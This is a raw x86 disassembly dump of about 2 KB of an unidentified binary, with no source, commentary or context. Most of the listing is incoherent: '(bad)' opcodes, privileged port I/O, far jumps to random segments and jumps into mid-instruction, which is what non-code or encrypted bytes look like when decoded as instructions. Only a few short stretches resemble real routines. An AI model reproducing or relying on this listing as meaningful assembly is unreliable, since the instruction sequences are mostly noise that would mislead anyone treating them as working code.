  408524:	inc    ebx
  408525:	fwait
  408526:	mov    ebx,0x13cd28b8
  40852b:	jg     0x408560
  40852d:	push   ebx
  40852e:	ret    
  40852f:	dec    eax
  408530:	sbb    eax,0xf49cf568
  408535:	mov    bh,0x60
  408537:	clc    
  408538:	call   0xde160490
  40853d:	sbb    bl,al
  40853f:	xor    eax,0x44bd6b8e
  408544:	out    0x34,eax
  408546:	clc    
  408547:	xor    BYTE PTR [ecx+0x42b40110],cl
  40854d:	jmp    0xb0ba2a5c
  408552:	mov    eax,ds:0x4221b00b
  408557:	mov    ah,0x82
  408559:	and    eax,0x50911af3
  40855e:	mov    bl,0x26
  408560:	pop    edi
  408561:	mov    DWORD PTR [ebp+0x664caa34],edx
  408567:	test   esi,eax
  408569:	or     ecx,DWORD PTR ds:0x24aad792
  40856f:	mov    WORD PTR [ebx-0x2a],gs
  408572:	into   
  408573:	test   bl,ah
  408575:	and    eax,ebp
  408577:	pop    eax
  408578:	push   cs
  408579:	dec    edx
  40857a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40857b:	adc    DWORD PTR [esi],esp
  40857d:	cld    
  40857e:	mov    edi,0x95c95615
  408583:	or     eax,0x757c1bfa
  408588:	cmp    al,0x2b
  40858a:	jle    0x40857b
  40858c:	lods   al,BYTE PTR ds:[esi]
  40858d:	sbb    ebx,DWORD PTR [ebp+0x6c]
  408590:	sub    esp,0x5d
  408593:	or     al,0xa3
  408595:	addr16 pop esp
  408597:	cdq    
  408598:	jnp    0x40859f
  40859a:	xor    BYTE PTR [ecx],dh
  40859c:	xchg   ebp,eax
  40859d:	and    al,0x95
  40859f:	ret    
  4085a0:	push   ds
  4085a1:	pop    eax
  4085a2:	xchg   edx,eax
  4085a3:	pop    ds
  4085a4:	mov    ch,0x2b
  4085a6:	imul   eax,ebx,0xea70a904
  4085ac:	add    esi,DWORD PTR [ebx]
  4085ae:	out    dx,eax
  4085af:	inc    ebp
  4085b0:	aaa    
  4085b1:	dec    eax
  4085b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085b3:	push   0x13
  4085b5:	arpl   WORD PTR [ebp-0x39e68694],ax
  4085bb:	std    
  4085bc:	pop    es
  4085bd:	adc    BYTE PTR cs:[edi+0x6df27ab8],0xc2
  4085c5:	call   DWORD PTR [esp+ecx*2-0x54]
  4085c9:	mov    al,ds:0xff882c9
  4085ce:	inc    esp
  4085cf:	dec    esi
  4085d0:	cdq    
  4085d1:	lods   al,BYTE PTR ds:[esi]
  4085d2:	dec    edx
  4085d3:	test   DWORD PTR cs:[esi-0xc3cc110],edi
  4085da:	and    ecx,DWORD PTR [ecx]
  4085dc:	or     BYTE PTR [edx-0x23f0e267],cl
  4085e2:	aam    0x63
  4085e4:	sub    eax,ebp
  4085e6:	xchg   edi,eax
  4085e7:	jmp    0x10dc:0xd21ae0a3
  4085ee:	or     eax,0xce702a19
  4085f3:	out    dx,al
  4085f4:	neg    DWORD PTR [esi+0x64fd599f]
  4085fa:	mov    ebx,0x16db61f2
  4085ff:	aaa    
  408600:	icebp  
  408601:	add    al,0x26
  408603:	lahf   
  408604:	sahf   
  408605:	in     eax,dx
  408606:	adc    al,0x50
  408609:	(bad)  
  40860a:	shl    BYTE PTR [edi-0x75],1
  40860d:	mov    edx,0x3eb8dc78
  408612:	fcom   DWORD PTR [eax-0x665ff4d3]
  408618:	xor    esp,edx
  40861a:	sub    esp,DWORD PTR [edi]
  40861c:	cmp    al,0xf6
  40861e:	fidiv  DWORD PTR [eax+0x7b63f98c]
  408624:	sbb    bl,dh
  408626:	sub    DWORD PTR [ecx],ebx
  408628:	and    eax,0x4381bc0b
  40862d:	fisttp WORD PTR ds:0xeb359551
  408633:	int    0x73
  408635:	in     al,0x9d
  408637:	sar    BYTE PTR [eax],0x52
  40863a:	test   eax,0xd85d9a23
  40863f:	dec    eax
  408640:	cmp    BYTE PTR [edx],bh
  408642:	xor    eax,0x856ff0b1
  408647:	mov    eax,ds:0xfeab3bda
  40864c:	lods   al,BYTE PTR ds:[esi]
  40864d:	mov    ch,0x6
  40864f:	mov    edi,0x9852fac
  408654:	and    dh,bh
  408656:	inc    edi
  408657:	or     eax,0x73075869
  40865c:	inc    ecx
  40865d:	daa    
  40865e:	and    DWORD PTR [edi-0xf],ebp
  408661:	sub    BYTE PTR [eax-0x4f],bl
  408664:	aad    0xc
  408666:	xchg   edi,eax
  408667:	ins    DWORD PTR es:[edi],dx
  408668:	fisub  DWORD PTR [esi]
  40866a:	loop   0x4086ce
  40866c:	clc    
  40866d:	push   edx
  40866e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40866f:	push   esp
  408670:	in     al,0x8
  408672:	aam    0xb8
  408674:	jmp    0x1d1ae980
  408679:	mov    ds:0x9399963b,eax
  40867e:	sub    bl,BYTE PTR [eax+0x548455f]
  408684:	lock and edx,DWORD PTR [ebp-0x6c]
  408688:	xor    ebp,0xf81b311
  40868e:	sub    bl,cl
  408690:	jge    0x408612
  408692:	pop    esi
  408693:	jmp    0xf5c82e3e
  408698:	push   ecx
  408699:	sbb    edi,DWORD PTR [ebx-0x71ed0148]
  40869f:	adc    DWORD PTR ds:0x433763,0x4336fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4337ef,0x433827
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x47d8b3b6],ecx
  4086ca:	loope  0x408656
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	sub    al,0xf9
  4086d5:	sbb    DWORD PTR [edx+0x3ba4d2e6],edx
  4086db:	mov    ds:0x840b5ad0,al
  4086e0:	push   0xa3c0dc95
  4086e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086e6:	pop    esp
  4086e7:	sbb    BYTE PTR [edi+0x5aa6a884],0x8c
  4086ee:	cli    
  4086ef:	jge    0x40875a
  4086f1:	sbb    DWORD PTR [ebx],ebp
  4086f3:	cli    
  4086f4:	dec    ebx
  4086f5:	enter  0xb92d,0x97
  4086f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086fa:	lods   eax,DWORD PTR ds:[esi]
  4086fb:	jmp    0xd37c:0x44efbfa6
  408702:	jo     0x4086cf
  408704:	shl    DWORD PTR [esi-0x15],0x67
  408708:	dec    DWORD PTR [esi+edi*1]
  40870b:	sar    bp,cl
  40870e:	mov    ch,0xc8
  408710:	sbb    dh,BYTE PTR [ecx+eax*8-0x7569bcc]
  408717:	or     cl,BYTE PTR [ebp-0x77ccd444]
  40871d:	repnz add dl,BYTE PTR ds:0x4506e20
  408724:	clc    
  408725:	jg     0x408756
  408727:	xchg   esp,eax
  408728:	mov    dl,0x2a
  40872a:	std    
  40872b:	add    al,0x1c
  40872d:	mov    esi,0x1efa302f
  408732:	push   edx
  408733:	push   edx
  408734:	push   edx
  408735:	push   esp
  408736:	and    edi,DWORD PTR [esp+ebp*8]
  408739:	repnz shl esi,cl
  40873c:	inc    esp
  40873d:	inc    esp
  40873e:	leave  
  40873f:	jg     0x40875d
  408741:	or     al,0x54
  408743:	xor    eax,DWORD PTR [edx+0x657d486b]
  408749:	out    dx,eax
  40874a:	out    dx,eax
  40874b:	jmp    0x361d:0xd8fac60a
  408752:	imul   edx,DWORD PTR [eax+0x2b8bb89b],0x59ee05ee
  40875c:	add    ebp,ecx
  40875e:	aas    
  40875f:	fst    QWORD PTR [edi-0x54efa69c]
  408765:	xor    BYTE PTR [esp],al
  408768:	xchg   BYTE PTR [esi+0x45],ch
  40876b:	imul   eax,DWORD PTR [edi],0x9841428
  408771:	mov    dl,0x14
  408773:	sub    bl,BYTE PTR [edi+0x30]
  408776:	pop    ds
  408777:	mov    ch,0xcc
  408779:	inc    ecx
  40877a:	ins    DWORD PTR es:[edi],dx
  40877b:	stos   DWORD PTR es:[edi],eax
  40877c:	push   edx
  40877d:	push   esi
  40877e:	imul   eax,DWORD PTR [ecx-0x38832fd4],0xf0854c95
  408788:	xor    bl,al
  40878a:	mov    DWORD PTR [ebx-0x7be89974],eax
  408790:	call   0xd0f4:0x7c51d825
  408797:	(bad)  
  408798:	shl    DWORD PTR [edx-0x31],1
  40879b:	or     al,0x78
  40879d:	jns    0x4087fb
  40879f:	and    ah,BYTE PTR [esi+0x7b]
  4087a2:	add    eax,0xfeb1c4e3
  4087a7:	out    dx,eax
  4087a8:	ret    
  4087a9:	aad    0x51
  4087ab:	pop    ss
  4087ac:	inc    edi
  4087ad:	nop
  4087ae:	mov    eax,ds:0xd837e5c9
  4087b3:	fdivr  QWORD PTR [eax]
  4087b5:	push   cs
  4087b6:	xor    ebx,DWORD PTR [ebx+edi*1]
  4087b9:	lods   eax,DWORD PTR ds:[esi]
  4087ba:	jmp    0x7048:0x3e3da2c1
  4087c1:	sahf   
  4087c2:	and    eax,0xa96e1b05
  4087c7:	ret    
  4087c8:	leave  
  4087c9:	pop    edi
  4087ca:	enter  0x6751,0xeb
  4087ce:	xchg   BYTE PTR [ebx+eax*2-0x7f],ah
  4087d2:	mov    bl,0xa1
  4087d4:	mov    esi,0x15b8ebf8
  4087d9:	pop    esi
  4087da:	adc    DWORD PTR [edi+esi*4-0x72],esp
  4087de:	inc    edi
  4087df:	(bad)  
  4087e0:	out    0xbd,eax
  4087e2:	mov    esp,0xa1752174
  4087e7:	rcl    DWORD PTR [edi-0x42],cl
  4087ea:	dec    edi
  4087eb:	mov    edx,0x7fc987ab
  4087f0:	pusha  
  4087f1:	sub    eax,0xff4fb440
  4087f6:	mov    esi,DWORD PTR [eax-0x44dc820b]
  4087fc:	das    
  4087fd:	aaa    
  4087fe:	jl     0x4087bc
  408800:	popa   
  408801:	mov    ebp,0xf90523a4
  408806:	jae    0x4087ad
  408808:	or     edx,ebx
  40880a:	in     al,0xd7
  40880c:	repz cs gs dec edx
  408810:	lods   eax,DWORD PTR ds:[esi]
  408811:	mov    bl,0x3a
  408813:	xchg   ebp,eax
  408814:	cs push 0xbd846723
  40881a:	push   eax
  40881b:	dec    ecx
  40881c:	jns    0x4087a9
  40881e:	push   es
  40881f:	repnz xlat BYTE PTR ds:[ebx]
  408822:	data16 mov dh,0x74
  408825:	(bad)  
  408826:	xchg   ebx,eax
  408827:	sbb    eax,0xb71333e1
  40882c:	cwde   
  40882d:	sub    al,0xb6
  40882f:	ins    DWORD PTR es:[edi],dx
  408830:	dec    edi
  408831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408832:	inc    ecx
  408833:	xor    BYTE PTR [edx+ebp*4+0x4c],al
  408837:	ja     0x40883e
  408839:	fiadd  WORD PTR [ecx]
  40883b:	call   0xc11a:0xcb1b1822
  408842:	shr    DWORD PTR [esi+0x41],1
  408845:	leave  
  408846:	push   ebx
  408847:	stc    
  408848:	in     eax,dx
  408849:	in     al,dx
  40884a:	sbb    eax,DWORD PTR [esi]
  40884c:	inc    edi
  40884d:	jmp    0x74a4:0x7b06345d
  408854:	lock neg BYTE PTR [ecx]
  408857:	xor    eax,DWORD PTR [ebx-0x7c]
  40885a:	ins    BYTE PTR es:[edi],dx
  40885b:	jg     0x40885f
  40885d:	mov    esi,0x1dc81ea5
  408862:	int    0x32
  408864:	hlt    
  408865:	xor    al,0xa7
  408867:	ret    
  408868:	sbb    eax,0x27f01f9f
  40886d:	sbb    eax,DWORD PTR [edx-0x3c]
  408870:	and    bh,cl
  408872:	mov    ah,0xa7
  408874:	adc    DWORD PTR [ebx+0x39],esp
  408877:	mov    ss,WORD PTR [esi]
  408879:	cmp    DWORD PTR [ebx+0x8ba3883],esi
  40887f:	test   BYTE PTR [ebp-0x6e],ch
  408882:	mov    ebp,0x3aeb20a
  408887:	inc    esp
  408889:	outs   dx,BYTE PTR ds:[esi]
  40888a:	test   al,0x84
  40888c:	repz (bad) 
  40888e:	lods   eax,DWORD PTR ds:[esi]
  40888f:	popa   
  408890:	addr16 clc 
  408892:	loopne 0x40888c
  408894:	fdiv   DWORD PTR [ebp+0x8150fdd]
  40889a:	mov    cs,WORD PTR [edi+ebx*4-0x59]
  40889e:	lahf   
  40889f:	lahf   
  4088a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088a1:	rcl    DWORD PTR [ecx-0x1e8b73d4],cl
  4088a7:	push   ebp
  4088a8:	jbe    0x4088c4
  4088aa:	push   0xffffffe0
  4088ac:	bound  ecx,QWORD PTR [edx]
  4088ae:	aaa    
  4088af:	pop    ss
  4088b0:	popf   
  4088b1:	pop    ds
  4088b2:	(bad)  
  4088b3:	xchg   ebp,eax
  4088b4:	dec    edi
  4088b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b6:	mov    edi,0x4e769dc
  4088bb:	retf   0xfcf
  4088be:	out    0xa6,al
  4088c0:	inc    BYTE PTR [ebp+ebp*8-0x30deeaa7]
  4088c7:	nop
  4088c8:	and    eax,0xbde92ff5
  4088cd:	jnp    0x4088cd
  4088cf:	mov    DWORD PTR [edi+0x16],ebx
  4088d2:	repz xchg ebx,eax
  4088d4:	push   es
  4088d5:	dec    esi
  4088d6:	mov    BYTE PTR [esi],0xba
  4088d9:	mov    edx,0x7e9368f8
  4088de:	sbb    DWORD PTR [esi-0x46970f4b],0x8
  4088e5:	jmp    0x4088be
  4088e7:	adc    DWORD PTR [edi+eiz*2],edx
  4088ea:	bound  ebx,QWORD PTR [eax+0x521ddac9]
  4088f0:	pop    ds
  4088f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088f2:	adc    eax,0xa0a8c314
  4088f7:	mov    al,0xa4
  4088f9:	push   esp
  4088fa:	cdq    
  4088fb:	or     dh,BYTE PTR [ebx+ecx*4+0x63358100]
  408902:	aaa    
  408903:	inc    ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xf545222c
  408968:	and    eax,0x7e7ed4b0
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	push   ebx
  408972:	inc    ebx
  408973:	or     edx,DWORD PTR [edi]
  408975:	add    esp,DWORD PTR [edx+0x53eb6574]
  40897b:	mov    ss,WORD PTR [edx-0x3f68ff47]
  408981:	mov    ch,0xac
  408983:	mov    eax,ds:0x943e524f
  408988:	bound  ebp,QWORD PTR [edi]
  40898a:	dec    ebp
  40898b:	cs ds aas 
  40898e:	xchg   ebx,eax
  40898f:	out    dx,eax
  408990:	and    eax,0x1bcd4e37
  408995:	pop    esi
  408996:	sub    edi,edi
  408998:	mov    al,ds:0x30dcab83
  40899d:	fnstenv [edi+0x29]
  4089a0:	add    ebx,DWORD PTR [edx-0x564cb07e]
  4089a6:	push   es
  4089a7:	std    
  4089a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a9:	mov    esp,0xc6ec5614
  4089ae:	push   edi
  4089af:	cmp    ecx,0x99d00306
  4089b5:	add    edx,DWORD PTR [edx+0x563c8d9a]
  4089bb:	out    0x5f,al
  4089bd:	mov    DWORD PTR [ebx+0x65c613fd],eax
  4089c3:	mov    bl,0x4
  4089c5:	pop    edi
  4089c6:	cli    
  4089c7:	clc    
  4089c8:	jmp    FWORD PTR [ebx+0x6be63c9c]
  4089ce:	adc    al,dh
  4089d0:	(bad)  
  4089d1:	xor    DWORD PTR [eax+0x53],ebx
  4089d4:	inc    eax
  4089d5:	popf   
  4089d6:	mov    ah,cl
  4089d8:	jp     0x408a4b
  4089da:	sbb    al,BYTE PTR ds:0xfd943f8a
  4089e0:	gs call 0xf699:0x1b935c91
  4089e8:	std    
  4089e9:	or     eax,0x58ff05a3
  4089ee:	test   BYTE PTR [ebx-0xf],ch
  4089f1:	cmp    al,0xda
  4089f3:	dec    edi
  4089f4:	ret    0xecbd
  4089f7:	sahf   
  4089f8:	xchg   bl,bh
  4089fa:	jg     0x40898d
  4089fc:	popf   
  4089fd:	xchg   DWORD PTR [ebx],ebx
  4089ff:	ja     0x408a38
  408a01:	mov    dh,0x1a
  408a03:	inc    edi
  408a04:	dec    ebx
  408a05:	(bad)  
  408a06:	sahf   
  408a07:	push   esi
  408a08:	dec    ecx
  408a09:	jae    0x408a08
  408a0b:	dec    ebp
  408a0c:	xor    esp,DWORD PTR [edi+0x508f7768]
  408a12:	or     eax,0x7609c6eb
  408a17:	push   cs
  408a18:	add    DWORD PTR [ebx],0xfffffff3
  408a1b:	pop    esp
  408a1c:	lock jnp 0x408a60
  408a1f:	mov    ebx,0x6bb357ec
  408a24:	fidiv  WORD PTR [eax]
  408a26:	stc    
  408a27:	adc    BYTE PTR ds:0x2c6417cd,dh
  408a2d:	(bad)  
  408a30:	imul   BYTE PTR [edx+0x4c5b25d]
  408a36:	jbe    0x408a2a
  408a38:	add    esi,eax
  408a3a:	(bad)  
  408a3c:	in     eax,dx
  408a3d:	lea    edx,ds:0x96c4a1c8
  408a43:	mov    al,ds:0x81d09ebc
  408a48:	sbb    BYTE PTR [ebx-0x7c2a4d3],dh
  408a4e:	cmc    
  408a4f:	(bad)  
  408a50:	std    
  408a51:	inc    esi
  408a52:	dec    ebx
  408a53:	mov    esi,0x9dde11b9
  408a58:	ss xchg edx,eax
  408a5a:	bound  edi,QWORD PTR [esi-0x7c]
  408a5d:	pop    esi
  408a5e:	std    
  408a5f:	es pop ebp
  408a61:	bound  ebx,QWORD PTR [ebp-0x3f]
  408a64:	aas    
  408a65:	jns    0x408a7c
  408a67:	mov    al,ds:0xf9a6f51e
  408a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a6d:	or     ah,BYTE PTR [esi]
  408a6f:	mov    bh,0xdf
  408a71:	jne    0x408aa0
  408a73:	pop    eax
  408a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a75:	cmc    
  408a76:	xor    eax,DWORD PTR [edi+0x384d6a7b]
  408a7c:	loope  0x408a28
  408a7e:	aam    0x51
  408a80:	jmp    0x408a75
  408a82:	push   ss
  408a83:	jnp    0x408a75
  408a85:	mov    gs,edx
  408a87:	retf   0x2d11
  408a8a:	inc    ecx
  408a8b:	mov    bh,0xb3
  408a8d:	sub    al,0xf5
  408a8f:	test   dh,ch
  408a91:	outs   dx,BYTE PTR ds:[esi]
  408a92:	xchg   DWORD PTR [ebx],ebx
  408a94:	lahf   
  408a95:	aam    0xae
  408a97:	retf   
  408a98:	scas   al,BYTE PTR es:[edi]
  408a99:	xchg   esi,eax
  408a9a:	out    dx,al
  408a9b:	push   es
  408a9c:	data16 clc 
  408a9e:	add    ah,BYTE PTR [edx]
  408aa0:	test   eax,0xdbb38e63
  408aa5:	stos   BYTE PTR es:[edi],al
  408aa6:	or     esi,DWORD PTR [ebp+0x19ebd2ee]
  408aac:	outs   dx,DWORD PTR cs:[esi]
  408aae:	jecxz  0x408b2f
  408ab0:	fimul  WORD PTR [eax+0x19318ea9]
  408ab6:	dec    esp
  408ab7:	ret    0x3dd5
  408aba:	adc    DWORD PTR [ebx-0x47],0x4
  408abe:	cmp    eax,0x950810af
  408ac3:	retf   
  408ac4:	retf   0x7691
  408ac7:	push   ebp
  408ac8:	in     al,dx
  408ac9:	cmp    eax,0x4979b2cf
  408ace:	mov    bl,0x14
  408ad0:	das    
  408ad1:	xlat   BYTE PTR ds:[ebx]
  408ad2:	sub    eax,DWORD PTR [ebx+esi*8-0x28]
  408ad6:	sbb    DWORD PTR ds:0x354220a3,esp
  408adc:	pop    edi
  408add:	jns    0x408ab6
  408adf:	in     al,0xfe
  408ae1:	jg     0x408b0d
  408ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ae4:	jle    0x408a74
  408ae6:	sbb    DWORD PTR ds:0xa6017f4f,edx
  408aec:	call   0x280b4392
  408af1:	test   al,0xe6
  408af3:	in     eax,0x1a
  408af5:	pop    ecx
  408af6:	dec    eax
  408af7:	jl     0x408aab
  408af9:	pop    esi
  408afa:	lock jbe 0x408aa0
  408afd:	shr    DWORD PTR [ecx],1
  408aff:	mov    ch,0x49
  408b01:	sub    al,0x50
  408b03:	xchg   BYTE PTR [ecx+0x521ecdee],al
  408b09:	js     0x408af2
  408b0b:	push   eax
  408b0c:	rol    ch,1
  408b0e:	jle    0x408b86
  408b10:	aad    0x10
  408b12:	rcl    edx,0x22
  408b15:	in     al,0x95
  408b17:	dec    edi
  408b18:	in     al,0x41
  408b1a:	jg     0x408b4a
  408b1c:	mov    dh,0x4b
  408b1e:	(bad)
  408b22:	(bad)  
  408b23:	or     al,BYTE PTR [ebx-0x2e68d1]
  408b29:	inc    edi
  408b2a:	xor    edx,ebp
  408b2c:	xchg   BYTE PTR [ebx+eax*1],bl
  408b2f:	call   0xf00057f4
  408b34:	dec    esi
  408b35:	jl     0x408b2d
  408b37:	cmp    bl,BYTE PTR [edx+eiz*8+0x6d]
  408b3b:	mov    ah,0xed
  408b3d:	test   BYTE PTR [ebx],bh
  408b3f:	dec    esp
  408b40:	mov    dh,0x5a
  408b42:	mov    ebp,0xc9b6ab90
  408b47:	mov    DWORD PTR [ebp+0x45a61991],esi
  408b4d:	sbb    BYTE PTR [edi+0xd700cdc],al
  408b53:	ror    ah,cl
  408b55:	jbe    0x408bb0
  408b57:	lds    edx,FWORD PTR [ebp-0x6934fdec]
  408b5d:	pop    edi
  408b5e:	jl     0x408b20
  408b60:	sub    al,0xaf
  408b62:	lock mov bl,0xa0
  408b65:	inc    esi
  408b66:	pop    ebx
  408b67:	ins    BYTE PTR es:[edi],dx
  408b68:	popa   
  408b69:	and    DWORD PTR [esp+edx*4-0x1e],eax
  408b6d:	test   al,0xfb
  408b6f:	mov    esp,0xc228d646
  408b74:	jbe    0x408b20
  408b76:	es add eax,0x18cdff62
  408b7c:	or     eax,ebx
  408b7e:	jmp    0xf3b5e060
  408b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b84:	clc    
  408b85:	and    eax,0x409c47ca
  408b8a:	adc    DWORD PTR [ebp+0x1a],esp
  408b8d:	ds mov eax,0xe129fed1
  408b93:	fbstp  TBYTE PTR [ebp+0x3a]
  408b96:	test   al,0x40
  408b98:	fsub   QWORD PTR [edi+0x62]
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	or     BYTE PTR [ecx+ecx*1+0x7ed2669a],dh
  408bf7:	jle    0x408c1d
  408bf9:	jl     0x408c79
  408bfb:	jle    0x408c34
  408bfd:	xor    al,0x73
  408bff:	and    eax,0x1fa6eed8
  408c04:	add    DWORD PTR [edx],ebx
  408c06:	adc    BYTE PTR [ecx+0x2c4c946e],dh
  408c0c:	js     0x408bfd
  408c0e:	dec    ecx
  408c0f:	add    eax,0x2a7a189b
  408c14:	scas   eax,DWORD PTR es:[edi]
  408c15:	and    dh,BYTE PTR [ebx]
  408c17:	add    eax,0xebe246e
  408c1c:	pop    ebp
  408c1d:	ret    0x3a48
  408c20:	lea    eax,[esi]
  408c22:	lock (bad) 
  408c24:	leave  
  408c25:	add    bl,ch
  408c27:	imul   ebp,DWORD PTR [ecx+ebx*8],0xcd940cde
  408c2e:	sub    eax,0x852626f6
  408c33:	inc    edx
  408c34:	in     eax,dx
  408c35:	xor    eax,0xfcfa3b2d
  408c3a:	or     bh,bh
  408c3c:	inc    ebx
  408c3d:	add    esi,DWORD PTR [ebx+eax*1+0x1abf1c5]
  408c44:	test   al,0x17
  408c46:	mov    BYTE PTR [edi-0x48cf73b],ch
  408c4c:	rcr    ch,0xa0
  408c4f:	mov    WORD PTR [edx],gs
  408c51:	sbb    ah,BYTE PTR [ecx]
  408c53:	jo     0x408cba
  408c55:	ret    
  408c56:	lds    eax,FWORD PTR [esi]
  408c58:	dec    ecx
  408c59:	mov    ebp,DWORD PTR [eax-0x39]
  408c5c:	mov    bl,0x29
  408c5e:	cwde   
  408c5f:	or     ebx,DWORD PTR [ebx-0x1d]
  408c62:	and    DWORD PTR [eax-0xb],edx
  408c65:	cmp    ch,ah
  408c67:	push   edx
  408c68:	dec    ebp
  408c69:	xor    eax,0xcfde67a
  408c6e:	outs   dx,BYTE PTR ds:[esi]
  408c6f:	addr16 repnz out 0xef,eax
  408c73:	sub    al,0xff
  408c75:	rol    BYTE PTR [ebx+edi*1],cl
  408c78:	jmp    0xd0f7:0x77ce4142
  408c7f:	imul   esp,DWORD PTR [esi-0x9],0xfffffffd
  408c83:	mov    ds:0x3322e460,eax
  408c88:	icebp  
  408c89:	leave  
  408c8a:	dec    edx
  408c8b:	sub    eax,0xb65ca0dc
  408c90:	rcr    BYTE PTR [eax],0x15
  408c93:	imul   edi,ebx,0x708f6907
  408c99:	sub    bh,bl
  408c9b:	mov    eax,ds:0x5904b6ec
  408ca0:	out    0x3d,eax
  408ca2:	(bad)  
  408ca3:	jmp    DWORD PTR [esi-0x34]
  408ca6:	(bad)  
  408ca7:	fiadd  DWORD PTR [edx]
  408ca9:	ficom  WORD PTR [esi]
  408cab:	dec    eax
  408cac:	push   esp
  408cad:	jo     0x408ca8
  408caf:	push   edx
  408cb0:	lea    esi,[eax-0x73]
  408cb3:	pusha  
  408cb4:	mov    WORD PTR [ebx],ss
  408cb6:	sub    ecx,DWORD PTR ds:0x749ebb3f
  408cbc:	popf   
  408cbd:	fnstcw WORD PTR [edi-0x81cd82a]
  408cc3:	loop   0x408cee
  408cc5:	std    
  408cc6:	mov    al,BYTE PTR [ebp+ebx*1-0x7ab88c6d]
  408ccd:	in     al,0x3
  408ccf:	ins    DWORD PTR es:[edi],dx
  408cd0:	sbb    ecx,DWORD PTR [ecx+0x9]
  408cd3:	icebp  
  408cd4:	shl    DWORD PTR [esi+0x4],0x88
  408cd8:	xor    DWORD PTR [edi],esi
  408cda:	popa   
  408cdb:	jmp    0x6384fb55
  408ce0:	dec    esi
  408ce1:	aad    0x2e
  408ce3:	lods   eax,DWORD PTR ds:[esi]
  408ce4:	ss xlat BYTE PTR ss:[ebx]
  408ce7:	add    al,0xcd
  408ce9:	mov    BYTE PTR [ebx],al
  408ceb:	inc    eax
  408cec:	dec    ebx
  408ced:	jecxz  0x408cd2
  408cef:	and    DWORD PTR [ecx+0x9],0x2b1308e8
  408cf6:	cmp    BYTE PTR [edi-0x350f7faa],cl
  408cfc:	jb     0x408d7a
  408cfe:	test   BYTE PTR [ebx],0x7d
  408d01:	adc    al,0xb
  408d03:	je     0x408d63
  408d05:	pop    ebx
  408d06:	int    0xba
  408d08:	push   edi
  408d09:	pop    esi
  408d0a:	js     0x408d7f
  408d0c:	test   DWORD PTR [edi],ebx
  408d0e:	xor    BYTE PTR ds:0x3356a951,cl
  408d14:	(bad)  
  408d15:	jbe    0x408d7c
  408d17:	mov    dl,BYTE PTR [esi+0x43]
  408d1a:	jg     0x408cab
  408d1c:	(bad)  
  408d1d:	mov    dl,0xd5
  408d1f:	adc    ebp,DWORD PTR [edi+0x1efe2a77]
  408d25:	inc    esi
  408d26:	xor    DWORD PTR [edx-0x33e40ff0],esi
  408d2c:	dec    ebx
  408d2d:	das    
  408d2e:	sub    DWORD PTR [edi],esi
  408d30:	mov    edx,0xaad73b39
  408d35:	or     eax,0x697460bf
  408d3a:	test   BYTE PTR [ecx+0x5d3a36ee],dl
